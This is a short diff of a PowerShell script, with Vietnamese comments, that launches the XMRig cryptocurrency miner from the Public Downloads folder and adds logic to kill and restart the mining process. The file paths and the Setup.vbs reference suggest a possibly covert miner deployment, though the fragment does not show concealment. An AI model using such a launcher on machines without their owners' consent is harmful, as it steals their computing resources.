@@ -3,8 +3,19 @@ $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
 $coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"
 
 function Start-CoinRun {
+    # Dừng tiến trình cũ nếu còn đang chạy
+    if ($global:coinRunProcess -and !$global:coinRunProcess.HasExited) {
+        try {
+            $global:coinRunProcess.Kill()
+            Write-Host "STOP"
+        } catch {
+            Write-Warning "DO NOT"
+        }
+    }
+
+    # Bắt đầu lại tiến trình mới
     $global:coinRunProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$coinRunPath`"" -PassThru
-    Write-Host "coinrun.cmd START"
+    Write-Host "🚀 coinrun.cmd START"
 }
 
 if (Test-Path $xmrigPath) {
